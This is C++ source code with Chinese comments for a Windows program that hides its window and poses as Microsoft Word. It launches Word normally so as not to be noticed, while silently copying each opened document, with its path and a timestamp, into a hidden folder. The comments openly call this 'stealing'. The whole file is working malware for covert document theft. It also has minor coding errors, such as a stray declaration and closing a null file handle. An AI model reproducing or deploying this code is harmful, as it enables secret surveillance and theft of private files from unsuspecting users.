#define _CRT_SECURE_NO_WARNINGS//防止因sprintf和fopen而狗叫
#include <iostream>
#include <windows.h>
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")//隐藏运行窗口
#include <string>
#include <time.h>
#include <sys/stat.h>//计算文件大小
using namespace std;
int steal(wstring path,unsigned short pathlength);//声明偷窃函数
int main(int argc,char* argv[])//主函数，包括传递文件路径信息
{
	if(argc==1)//避免被发现，正常打开word程序
	{
		ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",NULL, NULL, SW_SHOWNORMAL);
		return 0;
	}
	setlocale(LC_ALL,"chs");//设置地区为中国（中文）
	
	unsigned short pathlength=strlen(argv[1])+1;//存放路径长度，用于后面转成wstring类型
	wstring path;//路径存放变量
	wchar_t *temp=new wchar_t[pathlength];//临时指针变量，用于后面转成wstring类型
	mbstowcs(temp,argv[1],pathlength);
	path=temp;//转换为wstring
	delete[] temp;//释放临时变量
	ShellExecute(NULL, L"open",L"\"C:/Program Files/Microsoft Office/root/Office16/WINWORD.EXE\"",path.c_str(), NULL, SW_SHOWNORMAL);//执行打开正常word命令
	steal(path,pathlength);//实施盗窃
	return 0;
}

int steal(wstring path,unsigned short pathlength)
{
	//setlocale(LC_ALL,"chs");
	time_t temp;//声明时间变量
	temp=time(NULL);
	char* t;
	t=asctime(localtime(&temp));//时间转成文本可读，存在t中
	FILE *fp,*fp2;

	
	//int length=wcslen(path.c_str());
	//wstring转*wchar_t
	wchar_t *cp_path=new wchar_t[2*pathlength];
	unsigned long i=0;
	for(;i<pathlength;i++)
	{
		cp_path[i]=path[i];
	}
	cp_path[i]='\0';

	//尝试打开主文件
	fp=_wfopen(cp_path,L"rb");
	if(fp==NULL)//打开失败，写入日志
	{
		fp2=fopen("C:/Program Files/Microsoft Office/root/encryption/log","a");
		fputs(t,fp2);
		fputs("\n",fp2);
		fputws(cp_path,fp2);
		fputs("\n",fp2);
		fclose(fp);
		fclose(fp2);
		return 0;
	}

	//生成随机数，作为加密文件名
	srand(time(NULL));
	char buf[]="0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	char ecyname[9];
	sprintf(ecyname,"%c%c%c%c%c%c%c%c",buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62],buf[rand()%62]);
	char ecypath[60];
	sprintf(ecypath,"%s/%s","C:/Program Files/Microsoft Office/root/encryption",ecyname);


	fp2=fopen(ecypath,"wb+");//打开加密文件

	size_t getFileSizel((const char)cp_path);//获取文件大小
	struct _stat64 statbuf;
	_wstat64(cp_path,&statbuf);
	unsigned long filesize = statbuf.st_size;


	//写入路径信息
	i=0;
	while(i<pathlength)
	{
		fputwc(path[i],fp2);
		i++;
	}

	//写入分割数0x0000
	i=0;
	while(i<4)
	{
		fputc('0',fp2);
		i++;
	}

	//写入时间信息
	i=0;
	while(i<strlen(t))
	{
		fputc(t[i],fp2);
		i++;
	}

	//写入分割数0x0000
	i=0;
	while(i<6)
	{
		fputc('0',fp2);
		i++;
	}

	//写入（窃取）文件
	i=0;
	while(i<filesize)
	{
		fputc(fgetc(fp),fp2);
		i++;
	}
	fclose(fp);
	fclose(fp2);
	delete [] cp_path;//释放路径变量cp_path[]
	cp_path=NULL;
	return 0;
}